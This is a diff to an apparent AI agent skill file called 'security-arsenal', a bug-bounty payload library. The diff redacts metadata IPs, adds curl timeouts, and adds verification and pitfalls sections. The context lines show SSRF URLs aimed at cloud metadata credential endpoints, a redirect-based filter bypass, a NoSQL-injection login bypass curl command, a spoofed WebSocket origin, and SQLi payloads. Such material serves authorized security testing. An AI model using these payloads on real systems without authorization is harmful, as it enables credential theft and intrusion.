@@ -1,8 +1,11 @@
 ---
 name: security-arsenal
 description: Security payloads, bypass tables, wordlists, gf pattern names, always-rejected bug list, and conditionally-valid-with-chain table. Use when you need specific payloads for XSS/SSRF/SQLi/XXE/NoSQLi/command injection/SSTI/IDOR/path-traversal/HTTP smuggling/WebSocket/MFA bypass, bypass techniques, or to check if a finding is submittable. Also use when asked about what NOT to submit.
-sources: field_recon, hackerone_public, portswigger_research, payloadallthethings, github_security_advisories
-report_count: 200
+version: 1.1.0
+revision_date: 2026-07-25
+license: MIT
+category: redteam
+tags: [arsenal, tools, security, redteam]
 ---
 
 # SECURITY ARSENAL
@@ -81,18 +84,18 @@ location.href = SOURCE
 ### Cloud Metadata
 ```bash
 # AWS
-http://169.254.169.254/latest/meta-data/
-http://169.254.169.254/latest/meta-data/iam/security-credentials/
-http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
-http://169.254.169.254/latest/user-data/
-http://169.254.169.254/latest/dynamic/instance-identity/document
+http://[REDACTED_IP]/latest/meta-data/
+http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/
+http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/ROLE-NAME
+http://[REDACTED_IP]/latest/user-data/
+http://[REDACTED_IP]/latest/dynamic/instance-identity/document
 
 # GCP
 http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
 # Header: Metadata-Flavor: Google
 
 # Azure IMDS
-http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://[REDACTED_IP]/metadata/instance?api-version=2021-02-01
 # Header: Metadata: true
 ```
 
@@ -121,7 +124,7 @@ http://[::ffff:0x7f000001] # mixed hex IPv6
 
 # Redirect chain (Vercel pattern):
 # If filter only checks initial URL but follows redirects:
-http://allowed-domain.com/redirect?to=http://169.254.169.254/
+http://allowed-domain.com/redirect?to=http://[REDACTED_IP]/
 ```
 
 ---
@@ -315,7 +318,7 @@ GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
 
 ### Auth Bypass One-Liners
 ```bash
-curl -s -X POST https://target.com/api/login \
+curl --max-time 30 --connect-timeout 10 -s -X POST https://target.com/api/login \
   -H "Content-Type: application/json" \
   -d '{"username":{"$ne":null},"password":{"$ne":null}}'
 
@@ -555,7 +558,7 @@ wscat -c "wss://target.com/ws" -H "Origin: https://target.com.evil.com"
 {"action": "search", "query": "' OR 1=1--"}
 
 // SSRF (if server fetches URLs from messages)
-{"action": "preview", "url": "http://169.254.169.254/latest/meta-data/"}
+{"action": "preview", "url": "http://[REDACTED_IP]/latest/meta-data/"}
 ```
 
 ---
@@ -841,6 +844,30 @@ sensitive.txt      # Sensitive paths (.env, config.json, backup, etc.)
 
 ---
 
+## Verification
+
+1. **Payload catalog** — confirm payload breadth:
+   ```bash
+   grep -c "XSS\|SQLi\|SSRF\|XXE\|SSTI\|LFI" SKILL.md && echo "PASS: multiple vuln classes covered" || echo "FAIL"
+   ```
+2. **WAF bypass** — confirm bypass payloads exist:
+   ```bash
+   grep -q "bypass\|filter\|WAF\|encoding" SKILL.md && echo "PASS: bypass payloads present" || echo "FAIL"
+   ```
+All tests verify security arsenal readiness.
+
+---
+
+## Pitfalls
+- **Using payloads without understanding** — `<script>alert(1)</script>` is the most-blocked payload. Understand why bypasses work before using them.
+- **Assuming all payloads work on all targets** — XSS payloads for React differ from Angular, PHP, or classic HTML. Match payload to technology.
+- **One payload per test** — different WAFs/encodings/contexts require different payloads. Test at least 5 variants per vulnerability class.
+- **Stale payload lists** — WAF rules update. A bypass that worked last month may be patched. Test payloads against the current target.
+- **Payloads without context markers** — always use unique markers (8+ random chars) to confirm the payload was reflected, not just coincidence.
+
+
+---
+
 ## Related Skills & Chains
 
 - **`hunt-xss`** / **`hunt-ssrf`** / **`hunt-sqli`** / **`hunt-ssti`** / **`hunt-idor`** — When a hunter is actively testing a parameter and needs payloads. Workflow primitive: this skill is the payload library those hunt-* skills reach for; the hunt-* skill identifies the sink, this skill provides the syntax.
@@ -890,7 +917,7 @@ Generic words appear naturally in target content. A search for `javascript` hitt
 ```
 m=$(head -c 12 /dev/urandom | base64 | tr -d '+/=' | head -c 12)
 # now m is like "K7gXq2pNRm1z" — search for THIS in the response
-curl "https://target/search?q=${m}" | grep -c "$m"
+curl --max-time 30 --connect-timeout 10 "https://target/search?q=${m}" | grep -c "$m"
 ```
 
 If the marker appears in the response, you have reflection. If it appears unescaped in HTML context, you have XSS potential. If it appears in a Location header, redirect. If it appears in a SQL error, injection. The marker is the single source of truth — generic keywords lie.
